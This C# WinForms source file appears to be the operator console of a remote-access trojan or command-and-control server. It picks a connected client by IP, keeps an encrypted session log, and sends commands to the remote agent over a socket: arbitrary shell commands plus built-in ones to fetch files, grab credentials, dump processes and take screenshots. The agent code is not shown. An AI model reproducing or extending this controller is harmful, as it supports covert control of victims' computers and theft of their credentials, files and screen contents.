using Server_side.UserControls;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server_side
{
    public partial class ClientInfo : Form
    {
        private Dictionary<Socket, String> client;
        private Socket clientSocket;
        private string passPhrase;
        private Encryptor encryptor;

        public ClientInfo(string clientIP, string clientHostname, string connectTime, string clientOS)
        {
            InitializeComponent();
            ipLabel.Text = clientIP;
            hostnameLabel.Text = clientHostname;
            contimeLabel.Text = connectTime;
            osLabel.Text = clientOS;

            client = NetworkLayer.clientList.SelectMany(dict => dict)
                .Where(kvp => kvp.Key.RemoteEndPoint.ToString().Contains(clientIP))
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

            clientSocket = client.Keys.First();
            passPhrase = client.Values.First();

            InitializeSavedValues(clientIP);
            agentLogBox.TextChanged += agentLogBox_TextChanged;

            cmdComboBox.Items.Clear();
            cmdComboBox.Items.Add("Built-in Commands");
            cmdComboBox.Items.Add("Get File");
            cmdComboBox.Items.Add("Get Credential");
            cmdComboBox.Items.Add("Get Process Dump");
            cmdComboBox.Items.Add("Get Screenshot");
            cmdComboBox.Items.Add("Exit");
            cmdComboBox.SelectedIndex = 0;

            encryptor = new(passPhrase.Trim());
        }

        private void InitializeSavedValues(string clientIP)
        {
            string uid = $"{clientIP}_{passPhrase}";

            try
            {
                if (!Program.mySettings.Properties.Cast<System.Configuration.SettingsProperty>().Any(prop => prop.Name == uid))
                {
                    var newProperty = new System.Configuration.SettingsProperty(uid)
                    {
                        DefaultValue = string.Empty
                    };
                    Program.mySettings.Properties.Add(newProperty);
                    Program.mySettings.Save();
                }

                agentLogBox.Text = Program.mySettings.Properties[uid].DefaultValue.ToString();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error in InitializeSavedValues: " + e.Message);
            }
        }


        private void agentLogBox_TextChanged(object sender, EventArgs e)
        {
            Program.mySettings.Properties[$"{ipLabel.Text}_{passPhrase}"].DefaultValue = agentLogBox.Text;
            Program.mySettings.Save();
        }

        private void sendCommandBtn_Click(object sender, EventArgs e)
        {
            string delimiter = "|;|";
            string command = $"1{delimiter}{commandBox.Text}";

            keyLabel.Text = encryptor.GetKey();
            ivLabel.Text = encryptor.GetIV();
            passLabel.Text = passPhrase;

            byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
            NetworkLayer.Send(clientSocket, encryptedCommand);

            logging("Command sent: " + commandBox.Text);

            // Receive response
            byte[] response = NetworkLayer.ReceiveResult(clientSocket);
            string decryptedResponse = encryptor.Decrypt(response);
            logging("Response received: " + decryptedResponse);

            commandBox.Text = "";
        }

        private void logging(string log)
        {
            agentLogBox.AppendText(log + Environment.NewLine);
        }

        private void cmdComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            string placeholder = "";
            switch (cmdComboBox.SelectedIndex)
            {
                case 0:
                    commandBox.Text = "";
                    return;
                case 1:
                    placeholder = agentfileBox.Text;
                    break;
                case 2:
                    placeholder = "getcredential";
                    break;
                case 3:
                    placeholder = "getprocessdump";
                    break;
                case 4:
                    placeholder = "getscreenshot";
                    break;
                case 5:
                    placeholder = "exit";
                    break;
            }

            string delimiter = "|;|";
            string command = $"{cmdComboBox.SelectedIndex + 1}{delimiter}{placeholder}";
            byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
            NetworkLayer.Send(clientSocket, encryptedCommand);

            logging("Command sent: " + cmdComboBox.Text);

            // Receive response
            byte[] response = NetworkLayer.ReceiveResult(clientSocket);
            string decryptedResponse = encryptor.Decrypt(response);
            logging("Response received");
            // will handle tomorrow, imma sleep now to tired
        }
    }

}
